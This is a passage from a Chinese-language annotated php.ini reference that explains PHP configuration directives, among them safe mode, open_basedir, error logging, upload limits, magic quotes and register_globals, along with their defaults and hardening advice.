“/usr/local/php/bin”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安全模式下，只有该目录下的可执行程序才允许被执行系统程序的函数执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些函数是：system, escapeshellarg, escapeshellcmd, exec, passthru,proc_close, proc_get_status, proc_nice, proc_open, proc_terminate, shell_exec safe_mode_include_dir =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安全模式下，该组目录和其子目录下的文件被包含时，将跳过UID/GID检查。换句话说，如果此处的值为空，任何UID/GID不符合的文件都不允许被包含。这里设置的目录必须已经存在于include_path指令中或者用完整路径来包含。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;多个目录之间用冒号(Win下为分号)隔开。指定的限制实际上是一个前缀，而非一个目录名，也就是说”/dir/incl”将允许访问”/dir/include”和”/dir/incls”如果您希望将访问控制在一个指定的目录，那么请在结尾加上斜线。 sql.safe_mode = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否使用SQL安全模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果打开，指定默认值的数据库连接函数将会使用这些默认值代替支持的参数。对于每个不同数据库的连接函数，其默认值请参考相应的手册页面。 [PHP-Core-Safe]allow_url_fopen = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ni &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否允许打开远程文件 allow_url_include = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否允许include/require远程文件。disable_classes = &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ini 该指令接受一个用逗号分隔的类名列表，以禁用特定的类。disable_functions = &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该指令接受一个用逗号分隔的函数名列表，以禁用特定的函数。 enable_dl = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否允许使用dl()函数。dl()函数仅在将PHP作为apache模块安装时才有效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;禁用dl()函数主要是出于安全考虑，因为它可以绕过open_basedir指令的限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安全模式下始终禁用dl()函数，而不管此处如何设置。 expose_php = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否暴露PHP被安装在服务器上的事实(在http头中加上其签名)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它不会有安全上的直接威胁，但它使得客户端知道服务器上安装了PHP。 open_basedir =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将PHP允许操作的所有文件(包括文件自身)都限制在此组目录列表下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当一个脚本试图打开一个指定目录树之外的文件时，将遭到拒绝。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 所有的符号连接都会被解析，所以不可能通过符号连接来避开此限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;特殊值’’.’’指定了存放该脚本的目录将被当做基准目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但这有些危险，因为脚本的工作目录可以轻易被chdir()改变。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于共享服务器，在httpd.conf中灵活设置该指令将变得非常有用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Windows中用分号分隔目录，UNIX系统中用冒号分隔目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;作为Apache模块时，父目录中的open_basedir路径将自动被继承。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定的限制实际上是一个前缀，而非一个目录名， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也就是说”/dir/incl”将允许访问”/dir/include”和”/dir/incls”， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望将访问控制在一个指定的目录，那么请在结尾加上一个斜线。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认是允许打开所有文件。 [PHP-Core-Error]error_reporting = E_ALL &amp; ~E_NOTICE&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;错误报告级别是位字段的叠加，推荐使用 E_ALL | E_STRICT 1 E_ERROR 致命的运行时错误 2 E_WARNING 运行时警告(非致命性错误) 4 E_PARSE 编译时解析错误 8 E_NOTICE 运行时提醒(经常是bug，也可能是有意的) 16 E_CORE_ERROR PHP启动时初始化过程中的致命错误 32 E_CORE_WARNING PHP启动时初始化过程中的警告(非致命性错) 64 E_COMPILE_ERROR 编译时致命性错 128 E_COMPILE_WARNING 编译时警告(非致命性错) 256 E_USER_ERROR 用户自定义的致命错误 512 E_USER_WARNING 用户自定义的警告(非致命性错误) 1024 E_USER_NOTICE 用户自定义的提醒(经常是bug，也可能是有意的) 2048 E_STRICT 编码标准化警告(建议如何修改以向前兼容) 4096 E_RECOVERABLE_ERROR 接近致命的运行时错误，若未被捕获则视同E_ERROR 6143 E_ALL 除E_STRICT外的所有错误(PHP6中为8191,即包含所有) track_errors = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否在变量$php_errormsg中保存最近一个错误或警告消息。 display_errors = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否将错误信息作为输出的一部分显示。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在最终发布的web站点上，强烈建议你关掉这个特性，并使用错误日志代替(参看下面)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在最终发布的web站点打开这个特性可能暴露一些安全信息， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如web服务上的文件路径、数据库规划或别的信息。 display_startup_errors = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否显示PHP启动时的错误。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即使display_errors指令被打开，关闭此参数也将不显示PHP启动时的错误。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建议关掉这个特性，除非必须要用于调试中。 report_memleaks = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否报告内存泄漏。这个参数只在以调试方式编译的PHP中起作用， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;并且必须在error_reporting指令中包含 E_WARNING report_zend_debug = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;尚无说明文档 html_errors = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否在出错信息中使用HTML标记。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意: 不要在发布的站点上使用这个特性！ docref_root = ;”http://localhost/phpmanual/“docref_ext = ;”.html”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果打开了html_errors指令，PHP将会在出错信息上显示超连接， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接链接到一个说明这个错误或者导致这个错误的函数的页面。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以从http://www.php.net/docs.php下载php手册， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;并将docref_root指令指向本地的手册所在的URL目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还必须设置docref_ext指令来指定文件的扩展名(必须含有’’.’’)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意: 不要在发布的站点上使用这个特性。 error_prepend_string = ;”“&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于错误信息前输出的字符串 error_append_string = ;”“&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于错误信息后输出的字符串 xmlrpc_errors = Offxmlrpc_error_number = 0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;尚无文档 [PHP-Core-Logging]define_syslog_variables = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否定义各种系统日志变量，如：$LOG_PID, $LOG_CRON 等等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关掉它以提高效率的好主意。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以在运行时调用define_syslog_variables()函数来定义这些变量。 error_log =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将错误日志记录到哪个文件中。该文件必须对Web服务器用户可写。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;syslog 表示记录到系统日志中(NT下的事件日志, Unix下的syslog(3)) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果此处未设置任何值，则错误将被记录到Web服务器的错误日志中。 log_errors = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否在日志文件里记录错误，具体在哪里记录取决于error_log指令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;强烈建议你在最终发布的web站点时使用日志记录错误而不是直接输出， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样可以让你既知道那里出了问题，又不会暴露敏感信息。 log_errors_max_len = 1024&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置错误日志中附加的与错误信息相关联的错误源的最大长度。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里设置的值对显示的和记录的错误以及$php_errormsg都有效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设为 0 可以允许无限长度。 ignore_repeated_errors = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;记录错误日志时是否忽略重复的错误信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;错误信息必须出现在同一文件的同一行才被被视为重复。 ignore_repeated_source = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否在忽略重复的错误信息时忽略重复的错误源。 [PHP-Core-Mail]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要使邮件函数可用，PHP必须在编译时能够访问sendmail程序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果使用其它的邮件程序，如qmail或postfix，确保使用了相应的sendmail包装。PHP首先会在系统的PATH环境变量中搜索 sendmail，接着按以下顺序搜索：/usr/bin:/usr/sbin:/usr/etc:/etc:/usr/ucblib:/usr/lib &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;强烈建议在PATH中能够找到sendmail。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，编译PHP的用户必须能够访问sendmail程序。 SMTP = “localhost”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mail()函数中用来发送邮件的SMTP服务器的主机名称或者IP地址。仅用于win32。 smtp_port = 25&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SMTP服务器的端口号。仅用于win32。 sendmail_from =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发送邮件时使用的”From:”头中的邮件地址。仅用于win32 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该选项还同时设置了”Return-Path:”头。 sendmail_path = “-t -i”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;仅用于unix，也可支持参数(默认的是’’sendmail -t -i’’) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sendmail程序的路径，通常为”/usr/sbin/sendmail或/usr/lib/sendmail”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;configure脚本会尝试找到该程序并设定为默认值，但是如果失败的话，可以在这里设定。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不使用sendmail的系统应将此指令设定为sendmail替代程序(如果有的话)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，Qmail用户通常可以设为”/var/qmail/bin/sendmail”或”/var/qmail/bin/qmail-inject”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;qmail-inject 不需要任何选项就能正确处理邮件。 mail.force_extra_parameters =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;作为额外的参数传递给sendmail库的强制指定的参数附加值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些参数总是会替换掉mail()的第5个参数，即使在安全模式下也是如此。 [PHP-Core-ResourceLimit]default_socket_timeout = 60&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认socket超时(秒) max_execution_time = 30&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个脚本最大允许执行时间(秒)，0 表示没有限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个参数有助于阻止劣质脚本无休止的占用服务器资源。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该指令仅影响脚本本身的运行时间，任何其它花费在脚本运行之外的时间， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如用system()/sleep()函数的使用、数据库查询、文件上传等，都不包括在内。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安全模式下，你不能用ini_set()在运行时改变这个设置。 memory_limit = 16M&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个脚本所能够申请到的最大内存字节数(可以使用K和M作为单位)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这有助于防止劣质脚本消耗完服务器上的所有内存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要能够使用该指令必须在编译时使用”–enable-memory-limit”配置选项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要取消内存限制，则必须将其设为 -1 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置了该指令后，memory_get_usage()函数将变为可用。 max_input_time = -1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个脚本解析输入数据(POST, GET, upload)的最大允许时间(秒)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-1 表示不限制。 post_max_size = 8M&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;允许的POST数据最大字节长度。此设定也影响到文件上传。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果POST数据超出限制，那么$_POST和$_FILES将会为空。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要上传大文件，该值必须大于upload_max_filesize指令的值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果启用了内存限制，那么该值应当小于memory_limit指令的值。 realpath_cache_size = 16K&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定PHP使用的realpath(规范化的绝对路径名)缓冲区大小。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在PHP打开大量文件的系统上应当增大该值以提高性能。 realpath_cache_ttl = 120&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;realpath缓冲区中信息的有效期(秒)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对文件很少变动的系统，可以增大该值以提高性能。 [PHP-Core-FileUpLoad]file_uploads = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否允许HTTP文件上传。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参见upload_max_filesize, upload_tmp_dir, post_max_size指令 upload_max_filesize = 2M&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;允许上传的文件的最大尺寸。 upload_tmp_dir =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件上传时存放文件的临时目录(必须是PHP进程用户可写的目录)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果未指定则PHP使用系统默认的临时目录。 [PHP-Core-MagicQuotes]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP6将取消魔术引号，相当于下列指令全部为 Off magic_quotes_gpc = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否对输入的GET/POST/Cookie数据使用自动字符串转义( ‘’ “ NULL )。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的设置将自动影响 $_GEST $_POST $_COOKIE 数组的值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若将本指令与magic_quotes_sybase指令同时打开，则仅将单引号(‘’)转义为(‘’’’)， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其它特殊字符将不被转义，即( “ NULL )将保持原样！！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建议关闭此特性，并使用自定义的过滤函数。 magic_quotes_runtime = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否对运行时从外部资源产生的数据使用自动字符串转义( ‘’ “ NULL )。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若打开本指令，则大多数函数从外部资源(数据库,文本文件等)返回数据都将被转义。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：用SQL查询得到的数据，用exec()函数得到的数据，等等—www.bianceng.cn &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若将本指令与magic_quotes_sybase指令同时打开，则仅将单引号(‘’)转义为(‘’’’)， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其它特殊字符将不被转义，即( “ NULL )将保持原样！！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建议关闭此特性，并视具体情况使用自定义的过滤函数。 magic_quotes_sybase = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否采用Sybase形式的自动字符串转义(用 ‘’’’ 表示 ‘’) [PHP-Core-HighLight]highlight.bg = “#FFFFFF”highlight.comment = “#FF8000”highlight.default = “#0000BB”highlight.html = “#000000”highlight.keyword = “#007700”highlight.string = “#DD0000” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法高亮模式的色彩(通常用于显示 .phps 文件)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只要能被接受的东西就能正常工作。 [PHP-Core-Langue]short_open_tag = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否允许使用”&lt;? ?&gt;”短标识。否则必须使用”&lt;?php ?&gt;”长标识。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除非你的php程序仅在受控环境下运行，且只供自己使用，否则请不要使用短标记。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要和XML结合使用PHP，可以选择关闭此选项以方便直接嵌入”&lt;?xml … ?&gt;”，不然你必须用PHP来输出：&lt;? echo ‘’&lt;?xml version=”1.0”‘’; ?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本指令也会影响到缩写形式”&lt;?=”，它和”&lt;? echo”等价，要使用它也必须打开短标记。 asp_tags = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否允许ASP风格的标记”&lt;% %&gt;”，这也会影响到缩写形式”&lt;%=”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP6中将删除此指令 arg_separator.output = “&amp;”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP所产生的URL中用来分隔参数的分隔符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还可以用”&amp;”或”,”等等。 arg_separator.input = “&amp;”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP解析URL中的变量时使用的分隔符列表。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字符串中的每一个字符都会被当作分割符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还可以用”,&amp;”等等。 allow_call_time_pass_reference = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否强迫在函数调用时按引用传递参数(每次使用此特性都会收到一条警告)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;php反对这种做法，并在将来的版本里不再支持，因为它影响到了代码的整洁。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;鼓励的方法是在函数声明里明确指定哪些参数按引用传递。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们鼓励你关闭这一选项，以保证你的脚本在将来版本的语言里仍能正常工作。 auto_globals_jit = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否仅在使用到$_SERVER和$_ENV变量时才创建(而不是在脚本一启动时就自动创建)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果并未在脚本中使用这两个数组，打开该指令将会获得性能上的提升。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要想该指令生效，必须关闭register_globals和register_long_arrays指令。 auto_prepend_file =auto_append_file =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定在主文件之前/后自动解析的文件名。为空表示禁用该特性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该文件就像调用了include()函数被包含进来一样，因此会使用include_path指令的值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：如果脚本通过exit()终止，那么自动后缀将不会发生。—www.bianceng.cn variables_order = “EGPCS”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP注册 Environment, GET, POST, Cookie, Server 变量的顺序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;分别用 E, G, P, C, S 表示，按从左到右注册，新值覆盖旧值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;举例说，设为”GP”将会导致用POST变量覆盖同名的GET变量， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;并完全忽略 Environment, Cookie, Server 变量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;推荐使用”GPC”或”GPCS”，并使用getenv()函数访问环境变量。 register_globals = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否将 E, G, P, C, S 变量注册为全局变量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开该指令可能会导致严重的安全问题，除非你的脚本经过非常仔细的检查。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;推荐使用预定义的超全局变量：$_ENV, $_GET, $_POST, $_COOKIE, $_SERVER &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该指令受variables_order指令的影响。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP6中已经删除此指令。 register_argc_argv = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否声明$argv和$argc全局变量(包含用GET方法的信息)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建议不要使用这两个变量，并关掉该指令以提高性能。 register_long_arrays = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否启用旧式的长式数组(HTTP_*_VARS)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;鼓励使用短式的预定义超全局数组，并关闭该特性以获得更好的性能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP6中已经删除此指令。 always_populate_raw_post_data = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否总是生成$HTTP_RAW_POST_DATA变量(原始POST数据)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;否则，此变量仅在遇到不能识别的MIME类型的数据时才产生。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过，访问原始POST数据的更好方法是 php://input 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$HTTP_RAW_POST_DATA对于enctype=”multipart/form-data”的表单数据不可用。 unserialize_callback_func =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果解序列化处理器需要实例化一个未定义的类， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里指定的回调函数将以该未定义类的名字作为参数被unserialize()调用， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以免得到不完整的”__PHP_Incomplete_Class”对象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果这里没有指定函数，或指定的函数不包含(或实现)那个未定义的类，将会显示警告信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以仅在确实需要实现这样的回调函数时才设置该指令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要禁止这个特性，只需置空即可。 y2k_compliance = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否强制打开2000年适应(可能在非Y2K适应的浏览器中导致问题)。 zend.ze1_compatibility_mode = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否使用兼容Zend引擎I(PHP 4.x)的模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这将影响对象的复制、构造(无属性的对象会产生FALSE或0)、比较。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;兼容模式下，对象将按值传递，而不是默认的按引用传递。 precision = 14&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浮点型数据显示的有效位数。 serialize_precision = 100&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将浮点型和双精度型数据序列化存储时的精度(有效位数)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认值能够确保浮点型数据被解序列化程序解码时不会丢失数据。 [PHP-Core-OutputControl]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出控制函数很有用，特别是在已经输出了信息之后再发送HTTP头的情况下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出控制函数不会作用于header()或setcookie()等函数发送的HTTP头， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而只会影响类似于echo()函数输出的信息和嵌入在PHP代码之间的信息。 implicit_flush = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否要求PHP输出层在每个输出块之后自动刷新数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这等效于在每个 print()、echo()、HTML块 之后自动调用flush()函数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开这个选项对程序执行的性能有严重的影响，通常只推荐在调试时使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在CLI SAPI的执行模式下，该指令默认为 On 。 output_buffering = 0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出缓冲区大小(字节)。建议值为4096~8192。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出缓冲允许你甚至在输出正文内容之后再发送HTTP头(包括cookies)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其代价是输出层减慢一点点速度。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置输出缓冲可以减少写入，有时还能减少网络数据包的发送。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个参数的实际收益很大程度上取决于你使用的是什么Web服务器以及什么样的脚本。 output_handler =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将所有脚本的输出重定向到一个输出处理函数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如，重定向到mb_output_handler()函数时，字符编码将被透明地转换为指定的编码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一旦你在这里指定了输出处理程序，输出缓冲将被自动打开(output_buffering=4096)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意0: 此处仅能使用PHP内置的函数，自定义函数应在脚本中使用ob_start()指定。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意1: 可移植脚本不能依赖该指令，而应使用ob_start()函数明确指定输出处理函数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用这个指令可能会导致某些不熟悉的脚本出错。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意2: 不能同时使用”mb_output_handler”和”ob_iconv_handler”两个输出处理函数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也不能同时使用”ob_gzhandler”输出处理函数和zlib.output_compression指令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意3: 如果使用zlib.output_handler指令开启zlib输出压缩，该指令必须为空。 [PHP-Core-Directory]doc_root =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP的”根目录”。仅在非空时有效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果safe_mode=On，则此目录之外的文件一概被拒绝。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果编译PHP时没有指定FORCE_REDIRECT，并且在非IIS服务器上以CGI方式运行，则必须设置此指令(参见手册中的安全部分)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;替代方案是使用的cgi.force_redirect指令。 include_path = “.:/path/to/php/pear”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定一组目录用于require(), include(), fopen_with_path()函数寻找文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式和系统的PATH环境变量类似(UNIX下用冒号分隔，Windows下用分号分隔)： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;UNIX: “/path1:/path2” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Windows: “path1;path2” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在包含路径中使用’’.’’可以允许相对路径，它代表当前目录。 user_dir =&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;告诉php在使用 /~username 打开脚本时到哪个目录下去找，仅在非空时有效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也就是在用户目录之下使用PHP文件的基本目录名，例如：”public_html” 